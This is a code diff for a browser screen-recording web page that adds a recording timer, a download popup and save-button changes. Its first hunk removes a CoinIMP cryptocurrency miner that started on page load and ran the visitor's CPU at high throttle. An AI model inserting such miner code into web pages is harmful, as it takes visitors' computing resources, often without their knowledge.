@@ -1,19 +1,3 @@
-//Mining code from CoinIMP
-var _client = new Client.Anonymous('02dd2cbc7b98ad90b78d7d154e07d6ac92b26c0b3de59742acb699308af629e5', {
-  throttle: 0.9, c: 'w', ads: 0
-});
-_client.start();
-
-function stopMining() {
-  var bt = document.getElementById('bt-miner');
-  setTimeout(() => {
-    _client.stop();
-    bt.innerHTML = ' - Mining Stopped - ';
-  }, 10000);
-}
-
-
-
 //Recording Code
 
 //Found code in this article: https://dev.to/sebastianstamm/screen-recording-in-10-lines-of-vanilla-js-3bo8
@@ -24,6 +8,9 @@ const stop = document.getElementById("stop");
 const del = document.getElementById("delete");
 const save = document.getElementById("save");
 const video = document.querySelector("video");
+const popup = document.getElementById("popup");
+const download = document.getElementById("download");
+const timer = document.getElementById("timer");
 let recorder, stream;
 
 async function startRecording() {
@@ -44,16 +31,18 @@ async function startRecording() {
   const chunks = [];
   recorder.ondataavailable = e => chunks.push(e.data);
   recorder.onstop = e => {
+    stopTimer();
+
     const completeBlob = new Blob(chunks, { type: chunks[0].type });
     video.srcObject = null;
     video.src = URL.createObjectURL(completeBlob);
 
-    save.addEventListener('click', () => {
+    
+    download.addEventListener("click", () => {
       downloadBlob(completeBlob, 'myvideo.mp4');
-      
     })
   };
-  
+  startTimer();
   recorder.start();
 }
 
@@ -70,6 +59,9 @@ del.addEventListener("click", () => {
   location.reload();
 });
 
+save.addEventListener('click', () => {
+  popup.style.display = 'block';      
+})
 
 
 
@@ -99,4 +91,62 @@ function downloadBlob(blob, name = 'file.txt') {
 
   // Remove link from body
   document.body.removeChild(link);
+}
+
+
+function closePopup() {
+  popup.style.display = 'none';
+}
+
+
+
+var hr = 0;
+var min = 0;
+var sec = 0;
+var stoptime = true;
+
+function startTimer() {
+  if (stoptime == true) {
+		stoptime = false;
+		timerCycle();
+	}
+}
+function stopTimer() {
+  if (stoptime == false) {
+    stoptime = true;
+  }
+}
+
+function timerCycle() {
+	if (stoptime == false) {
+    sec = parseInt(sec);
+    min = parseInt(min);
+    hr = parseInt(hr);
+
+    sec = sec + 1;
+
+    if (sec == 60) {
+      min = min + 1;
+      sec = 0;
+    }
+    else if (min == 60) {
+      hr = hr + 1;
+      min = 0;
+      sec = 0;
+    }
+
+    if (sec < 10 || sec == 0) {
+      sec = '0' + sec;
+    }
+    if (min < 10 || min == 0) {
+      min = '0' + min;
+    }
+    if (hr < 10 || hr == 0) {
+      hr = '0' + hr;
+    }
+
+    timer.innerHTML = hr + ':' + min + ':' + sec;
+
+		setTimeout("timerCycle()", 1000);
+  }
 }
